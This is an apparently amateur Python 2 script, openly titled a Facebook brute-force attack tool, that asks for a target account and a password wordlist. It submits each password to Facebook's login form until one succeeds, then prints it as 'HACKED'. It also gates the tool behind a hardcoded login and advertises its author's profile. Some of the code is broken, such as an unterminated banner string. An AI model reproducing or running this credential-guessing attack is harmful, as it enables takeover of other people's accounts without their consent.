#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    FACEBOOK BRUTE ATTACK (TARGET 2020)   #
        #    MY FACEBOOK ID LINK 👉. https://www.facebook.com/syedRahim88899
        #      AnY Type Help Need Come To My Facebook I'd                                      
        #############################################
 
 
import time
import os
 
os.system('clear')
time.sleep(0.1)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
 
print("\033[1;91m=====================================")
print(" \033[1;92m ___   ___  ________
  / _ | / _ \/  _/ __/
 / __ |/ , _// // _/  
/_/ |_/_/|_/___/_/ '')
print"\033[1;96mDEV   :  \033[1;95mSYED RAHIM"
print"\033[1;96mTOOL  :  \033[1;95mFACEBOOK BRUTEFORCE "
print"\033[1;94m---------------------------------------"
print""
 
print ("\033[1;91m===================================")

CorrectUsername = "ARIF"
CorrectPassword = "ARIF"
 
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;92m🔑\x1b[1;93mTool Username \x1b[1;96m == \x1b[1;95m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;92m🔑\x1b[1;93mTool Password  \x1b[1;96m == \x1b[1;95m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev: SYEDRAHIM
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://youtu.be/Vcg8yW4pwsw')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://youtu.be/Vcg8yW4pwsw')
 
print ("\033[1;91m===================================")

time.sleep(0.1)
user = raw_input('[?] Target Username/ID/Email >>> ')
time.sleep(0.1)
wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')  
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()
 
time.sleep(0.1)
print '\n\nCracking '+user+' Now...'
 
time.sleep(0.1)
print '\n\033[1;96m###############💀 SYED RAHIM 💀##############\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password HACKED ♥️ '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] NOT HACK 🔥 "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()
 
time.sleep(0.1)
print 'Password is not Crack 👉 Try again 👈.'
time.sleep(0.1)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
